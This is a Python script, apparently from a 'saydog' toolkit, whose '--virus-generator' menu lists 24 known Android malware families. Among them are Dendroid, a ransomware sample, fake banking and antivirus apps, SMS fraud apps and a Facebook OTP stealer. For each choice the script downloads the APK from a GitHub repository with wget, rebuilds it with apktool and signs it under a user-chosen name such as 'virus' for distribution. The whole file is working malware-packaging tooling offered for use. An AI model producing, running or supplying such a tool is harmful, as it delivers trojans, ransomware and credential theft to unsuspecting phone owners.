import os
import sys
import time
from sys import *

#################### font colors ####################
w="\033[00m"
r="\033[31m"
g="\033[32m"
y="\033[33m"
b="\033[34m"
p="\033[35m"
c="\033[36m"
W="\033[47m"
R="\033[41m"
B="\033[0;30m"

#################### menu ####################
def menu():
        try:
                print ("")
                print (w+"{"+B+W+" ANDROID "+w+"}")
                print ("")
                print ("{1}--- Advance")
                print ("{2}--- Agents")
                print ("{3}--- Badnews")
                print ("{4}--- Bios")
                print ("{5}--- Blat sms")
                print ("{6}--- Brain test")
                print ("{7}--- Crd informations")
                print ("{8}--- Candy corn")
                print ("{9}--- Cats ransom")
                print ("")
                print ("{10}-- Chis cortos")
                print ("{11}-- Chis ticos")
                print ("{12}-- Claco")
                print ("{13}-- Dend droid")
                print ("{14}-- Drop dialer")
                print ("{15}-- Facebook otp")
                print ("{16}-- Fake banking")
                print ("{17}-- Fake cmcc")
                print ("{18}-- Fake op")
                print ("{19}-- Fake validation")
                print ("")
                print ("{20}-- Fake av")
                print ("{21}-- Images pets")
                print ("{22}-- Laugher")
                print ("{23}-- Oh my godness")
                print ("{24}-- Sms worker")
                print ("")
                print ("{0}--- Back to main menu")
                print ("")
                main()
        except KeyboardInterrupt:
                sys.exit(1)

#################### main ####################
def main():
        dog = str(input("choose@number:~$ "))
        if dog == "back" or dog == "0" or dog == "00":
                sys.exit(1)
        elif dog == "1" or dog == "01":
                apkname = "AdvanceOBF.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p android keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "2" or dog == "02":
                apkname = "Agent.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "3" or dog == "03":
                apkname = "BAD_NEWS.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "4" or dog == "04":
                apkname = "BiOs.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "5" or dog == "05":
                apkname = "BlatSMS.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "6" or dog == "06":
                apkname = "BrainTest.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "7" or dog == "07":
                apkname = "CRD-Information.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "8" or dog == "08":
                apkname = "CandyCORN.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "9" or dog == "09":
                apkname = "Cats.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "10":
                print ("")
                apkname = "ChisCORTOS.apk"
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "11":
                print ("")
                apkname = "ChisTICOS.apk"
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "12":
                apkname = "Claco.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "13":
                apkname = "Dend-Droid.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "14":
                apkname = "Drop-Dialer.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "15":
                apkname = "Facebook-OTP.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "16":
                apkname = "Fake-BANK.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "17":
                apkname = "Fake-CMCC.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "18":
                apkname = "Fake-OP.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "19":
                apkname = "Fake-VALID.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "20":
                apkname = "Fake-AV.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "21":
                apkname = "Image-PETS.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "22":
                apkname = "Laughter.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "23":
                apkname = "OMYGOD.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        elif dog == "24":
                apkname = "Sms-WORKER.apk"
                print ("")
                name = str(input("set filename [ex: virus]: "))
                outp = str(input("set output [ex: /sdcard]: "))
                print ("")
                print (b+"[+]"+w+" downloading apk files")
                os.system("wget -O main.apk https://github.com/saydog/vdapp/raw/master/"+apkname+" &> /dev//null")
                print (b+"[+]"+w+" decompiling apk using apktool")
                os.system("proot -0 apktool d main.apk &> /dev//null")
                print (b+"[+]"+w+" building apk using apktool")
                os.system("proot -0 apktool b main --output main.apk &> /dev//null;rm -rf main")
                print (b+"[+]"+w+" signing apk files")
                os.system("proot -0 apksigner -p saydog keystore main.apk "+outp+"/"+name+".apk &> /dev//null;rm -rf main.apk '?'")
                print (g+"[+]"+w+" sign successfully")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        else:
                print (r+"[commands not found] please choose the number"+w)
                main()

if "__main__" == __name__:
    if "--virus-generator" in sys.argv:
        menu()
    else:
            os.system("saydog")